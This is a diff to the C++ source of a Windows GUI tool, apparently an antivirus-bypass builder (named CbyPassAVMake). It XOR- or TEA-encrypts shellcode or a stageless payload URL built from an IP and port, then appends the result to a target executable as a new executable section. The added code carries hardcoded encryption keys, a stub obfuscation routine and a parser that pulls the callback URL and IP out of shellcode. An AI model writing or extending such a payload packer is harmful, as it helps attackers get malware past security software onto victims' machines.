@@ -65,6 +65,9 @@ void CbyPassAVMakeDlg::DoDataExchange(CDataExchange* pDX)
 	DDX_Control(pDX, IDC_LIST1, mList);
 	DDX_Control(pDX, IDC_EDIT3, mFileBin);
 	DDX_Control(pDX, IDC_EDIT4, mDstFile);
+	DDX_Control(pDX, IDC_EDIT5, mStagelessURL);
+	DDX_Control(pDX, IDC_EDIT6, mStagelessIP);
+	DDX_Control(pDX, IDC_EDIT7, mPort);
 }
 
 BEGIN_MESSAGE_MAP(CbyPassAVMakeDlg, CDialogEx)
@@ -75,6 +78,7 @@ BEGIN_MESSAGE_MAP(CbyPassAVMakeDlg, CDialogEx)
 	ON_BN_CLICKED(IDC_BUTTON2, &CbyPassAVMakeDlg::OnBnClickedButton2)
 	ON_BN_CLICKED(IDC_BUTTON3, &CbyPassAVMakeDlg::OnBnClickedButton3)
 	ON_BN_CLICKED(IDC_BUTTON4, &CbyPassAVMakeDlg::OnBnClickedButton4)
+	ON_BN_CLICKED(IDC_BUTTON5, &CbyPassAVMakeDlg::OnBnClickedButton5)
 END_MESSAGE_MAP()
 
 
@@ -124,9 +128,10 @@ BOOL CbyPassAVMakeDlg::OnInitDialog()
 	this->mList.SetColumn(2, &co);
 	this->mList.SetColumnWidth(0, 65);
 
-	this->mCodesLen.SetWindowTextA("10");
+	mCodesLen.SetWindowTextA("10");
 	::EnableWindow(mCodesLen, FALSE);
-	CheckDlgButton(IDC_CHECK4, TRUE);
+	CheckDlgButton(IDC_RADIO4, TRUE);
+	mPort.SetWindowTextA("8181");
 
 	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
 }
@@ -414,7 +419,73 @@ void CbyPassAVMakeDlg::tea_decrypt(unsigned char* in, unsigned int inlen, unsign
 }
 
 
-//确定按钮事件
+//反汇编补丁代码
+BOOL CbyPassAVMakeDlg::InitDisaDate(STu8* pPatch, STu32 dwSize)
+{
+	//先清除数据
+	mList.DeleteAllItems();
+
+	ULONGLONG offset = 0;//用于反汇编地址偏移
+	unsigned int mode = 0;
+	//判断机器位数
+#ifdef PE_MODEL
+	mode = 32;
+#else
+	mode = 64;
+#endif
+
+	char* pCode = (char*)pPatch;
+	unsigned int size = dwSize;
+	unsigned int pStartAddr = 0;
+
+	for (unsigned int len = 0, i = 0; len < size; i++)
+	{
+		CString strBuffer;
+		strBuffer.Format("%08X", pStartAddr + len);
+		this->mList.InsertItem(i, strBuffer);
+		t_disasm da;
+		len += Disasm(pCode + len, MAXCMDSIZE, pStartAddr + len, &da, DISASM_CODE);
+		if (da.cmdtype == C_CAL)
+		{
+			//call指令
+			if (*(pCode + len) == 0x2F)
+			{
+				mStagelessURL.SetWindowTextA(CString(pCode + len));
+			}
+			else if (*(pCode + len + 1) == 0x2E || *(pCode + len + 2) == 0x2E || *(pCode + len + 3) == 0x2E)
+			{
+				mStagelessIP.SetWindowTextA(CString(pCode + len));
+			}
+		}
+		//端口是push 立即数，暂时无法解析
+		//else if (strcmp(da.vm_name, "VPUSH_IMM32") == 0 && (da.immconst>=80 && da.immconst<=65535))
+		//{
+		//	//push指令
+		//}
+		strBuffer.Empty();
+		strBuffer.Append(da.dump);
+		this->mList.SetItemText(i, 1, strBuffer);
+		strBuffer.Empty();
+		strBuffer.Append(da.result);
+		this->mList.SetItemText(i, 2, strBuffer);
+	}
+	return TRUE;
+}
+
+//混肴代码
+void CbyPassAVMakeDlg::ConfusionCodes(STu8 *oricode, STu32 oricodesize, STu8 ** dstcode, STu32 * dstcodesize)
+{
+	int i, j, n;
+	ulong l;
+	char* pasm;
+	t_asmmodel am;
+	char s[TEXTLEN], errtext[TEXTLEN];
+
+	pasm = "ADD [DWORD 475AE0],1";
+	Assemble(pasm, 0x400000, &am, 0, 0, errtext);
+}
+
+//捆绑stage payload
 void CbyPassAVMakeDlg::OnBnClickedButton1()
 {
 	// TODO: 在此添加控件通知处理程序代码
@@ -475,52 +546,72 @@ void CbyPassAVMakeDlg::OnBnClickedButton1()
 	CloseHandle(mHandle);
 
 	//处理shellcode数据，增加花指令,暂时填充NOP
-	if(nopbytes)
+	if (nopbytes)
 		memset(pVirMem, 0x90, nopbytes);
-
+	
+	STu8* shellcode = 0;
+	STu32 shellcodesize = 0;
+	ConfusionCodes(pVirMem + nopbytes, dwShellCodeSize, &shellcode, &shellcodesize);
+	//卸载大内存
+	MemMgr::GetInstance().CommonDeallocate(TypeSGIVirtualAllocTAlloc, pVirMem);
+	
 	//处理shellcode数据，加密shellcode代码
-
-	if (IsDlgButtonChecked(IDC_CHECK1))
+	ByteBuffer encPacket;
+	if (IsDlgButtonChecked(IDC_RADIO1))
 	{
-		//xor加密
+		//封装加密类型
+		encPacket.append(H_ENC_XOR);
+
+		//封装SCPacket
+		ByteBuffer scPacket;
+		scPacket.append(P_TYPE_STAGE);
+		scPacket.append(STu32(dwVirMemSize));
+		scPacket.append(pVirMem, dwVirMemSize);
+		encPacket.append(STu32(scPacket.size()));
+
+		//XOR加密
 		STu8 XOR_BYTES[] = { 0x56,0xb0,0x71,0xef,0xd7,0xe9,0x92,0x69,0x81,0xe9,0xb1,0x74,0x21,0x6d,0x8f,0x86 };
 		STu32 XOR_BYTES_LEN = sizeof(XOR_BYTES);
-		for(int i = 0; i < dwVirMemSize; i++)
+		for (int i = 0; i < scPacket.size(); i++)
 		{
-			pVirMem[i] ^= XOR_BYTES[i % XOR_BYTES_LEN];
+			encPacket.append(scPacket[i] ^ XOR_BYTES[i % XOR_BYTES_LEN]);
 		}
 	}
-	else if (IsDlgButtonChecked(IDC_CHECK2))
+	else if (IsDlgButtonChecked(IDC_RADIO2))
 	{
 		//aes加密
 		STu8 RC4_AES_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
 	}
-	else if (IsDlgButtonChecked(IDC_CHECK3))
+	else if (IsDlgButtonChecked(IDC_RADIO3))
 	{
 		//RC4加密
 		STu8 RC4_AES_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
 	}
-	else if (IsDlgButtonChecked(IDC_CHECK4))
+	else if (IsDlgButtonChecked(IDC_RADIO4))
 	{
+		//封装加密类型
+		encPacket.append(H_ENC_TEA);
+
+		//封装SCPacket
+		ByteBuffer scPacket;
+		scPacket.append(P_TYPE_STAGE);
+		scPacket.append(STu32(dwVirMemSize));
+		scPacket.append(pVirMem, dwVirMemSize);
+
 		//tea加密
 		STu8 TEA_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
 		unsigned char* out = 0;
 		unsigned int outlen = 0;
-		tea_encrypt(pVirMem, dwVirMemSize, TEA_KEY, &out, &outlen);
-		MemMgr::GetInstance().CommonDeallocate(TypeSGIVirtualAllocTAlloc, pVirMem);
-		dwVirMemSize = outlen;
-		pVirMem = MemMgr::GetInstance().CommonAlloc(TypeSGIVirtualAllocTAlloc, dwVirMemSize);
-		if (pVirMem == NULL)
-		{
-			AfxMessageBox("内存分配失败!");
-			return;
-		}
-		memcpy(pVirMem, out, dwVirMemSize);
+		tea_encrypt((unsigned char*)(scPacket.contents()), scPacket.size(), TEA_KEY, &out, &outlen);
+
+		//封装加密数据
+		encPacket.append(STu32(outlen));
+		encPacket.append(out, outlen);
 		free(out);
 	}
 
 	//shellcode数据添加到目标程序新区段
-	bool bRet = mPEMake.AddSectionToEnd((STu8*)strName.GetBuffer(0), pVirMem, dwVirMemSize, IMAGE_SCN_MEM_READ| IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE);
+	bool bRet = mPEMake.AddSectionToEnd((STu8*)strName.GetBuffer(0), encPacket.contents(), encPacket.size(), IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE);
 	if (bRet)
 	{
 		OnSaveAs();
@@ -528,8 +619,94 @@ void CbyPassAVMakeDlg::OnBnClickedButton1()
 	}
 	else
 		CDialogEx::OnCancel();
-	MemMgr::GetInstance().CommonDeallocate(TypeSGIVirtualAllocTAlloc, pVirMem);
-	
+}
+
+//捆绑stageless url
+void CbyPassAVMakeDlg::OnBnClickedButton5()
+{
+	CString strName;
+	mSecName.GetWindowText(strName);
+	if (strName.GetLength() == 0)
+	{
+		AfxMessageBox("区段名为空!");
+		return;
+	}
+
+	//封装stageless url
+	CStringA url;
+	mStagelessURL.GetWindowTextA(url);
+	CStringA ip;
+	mStagelessIP.GetWindowTextA(ip);
+	CString port;
+	mPort.GetWindowTextA(port);
+	CStringA _url = "http://" + ip + ":" + port + url;
+	ByteBuffer shellcode;
+	shellcode.append((unsigned char*)(_url.GetBuffer()), _url.GetLength());
+
+	//处理shellcode数据，加密shellcode代码
+	ByteBuffer encPacket;
+	if (IsDlgButtonChecked(IDC_RADIO1))
+	{
+		//封装加密类型
+		encPacket.append(H_ENC_XOR);
+
+		//封装SCPacket
+		ByteBuffer scPacket;
+		scPacket.append(P_TYPE_STAGELESSURL);
+		scPacket.append(STu32(shellcode.size()));
+		scPacket.append(shellcode.contents(), shellcode.size());
+		encPacket.append(STu32(scPacket.size()));
+
+		//XOR加密
+		STu8 XOR_BYTES[] = { 0x56,0xb0,0x71,0xef,0xd7,0xe9,0x92,0x69,0x81,0xe9,0xb1,0x74,0x21,0x6d,0x8f,0x86 };
+		STu32 XOR_BYTES_LEN = sizeof(XOR_BYTES);
+		for (int i = 0; i < scPacket.size(); i++)
+		{
+			encPacket.append(scPacket[i] ^ XOR_BYTES[i % XOR_BYTES_LEN]);
+		}
+	}
+	else if (IsDlgButtonChecked(IDC_RADIO2))
+	{
+		//aes加密
+		STu8 RC4_AES_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
+	}
+	else if (IsDlgButtonChecked(IDC_RADIO3))
+	{
+		//RC4加密
+		STu8 RC4_AES_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
+	}
+	else if (IsDlgButtonChecked(IDC_RADIO4))
+	{
+		//封装加密类型
+		encPacket.append(H_ENC_TEA);
+
+		//封装SCPacket
+		ByteBuffer scPacket;
+		scPacket.append(P_TYPE_STAGELESSURL);
+		scPacket.append(STu32(shellcode.size()));
+		scPacket.append(shellcode.contents(), shellcode.size());
+
+		//TEA加密
+		STu8 TEA_KEY[] = { 0xd1,0x44,0x2a,0x36,0x4f,0xae,0x72,0xce,0xf9,0x16,0xff,0xe6,0xc2,0x1e,0xbf,0xb7 };
+		unsigned char* out = 0;
+		unsigned int outlen = 0;
+		tea_encrypt((unsigned char*)(scPacket.contents()), scPacket.size(), TEA_KEY, &out, &outlen);
+
+		//封装加密数据
+		encPacket.append(STu32(outlen));
+		encPacket.append(out, outlen);
+		free(out);
+	}
+
+	//shellcode数据添加到目标程序新区段
+	bool bRet = mPEMake.AddSectionToEnd((STu8*)strName.GetBuffer(0), encPacket.contents(), encPacket.size(), IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_EXECUTE);
+	if (bRet)
+	{
+		OnSaveAs();
+		CDialogEx::OnOK();
+	}
+	else
+		CDialogEx::OnCancel();
 }
 
 
@@ -538,42 +715,6 @@ void CbyPassAVMakeDlg::OnBnClickedButton2()
 {
 	// TODO: 在此添加控件通知处理程序代码
 	CDialogEx::OnCancel();
-}
-
-//反汇编补丁代码
-BOOL CbyPassAVMakeDlg::InitDisaDate(STu8* pPatch, STu32 dwSize)
-{
-	//先清除数据
-	mList.DeleteAllItems();
-
-	ULONGLONG offset = 0;//用于反汇编地址偏移
-	unsigned int mode = 0;
-	//判断机器位数
-#ifdef PE_MODEL
-	mode = 32;
-#else
-	mode = 64;
-#endif
-
-	char* pCode = (char*)pPatch;
-	unsigned int size = dwSize;
-	unsigned int pStartAddr = 0;
-
-	for (unsigned int len = 0, i = 0; len < size; i++)
-	{
-		CString strBuffer;
-		strBuffer.Format("%08X", pStartAddr + len);
-		this->mList.InsertItem(i, strBuffer);
-		t_disasm da;
-		len += Disasm(pCode + len, MAXCMDSIZE, pStartAddr + len, &da, DISASM_CODE);
-		strBuffer.Empty();
-		strBuffer.Append(da.dump);
-		this->mList.SetItemText(i, 1, strBuffer);
-		strBuffer.Empty();
-		strBuffer.Append(da.result);
-		this->mList.SetItemText(i, 2, strBuffer);
-	}
-	return TRUE;
 }
 
 //选择补丁文件
@@ -677,3 +818,5 @@ void CbyPassAVMakeDlg::OnSaveAs()
 	}
 
 }
+
+
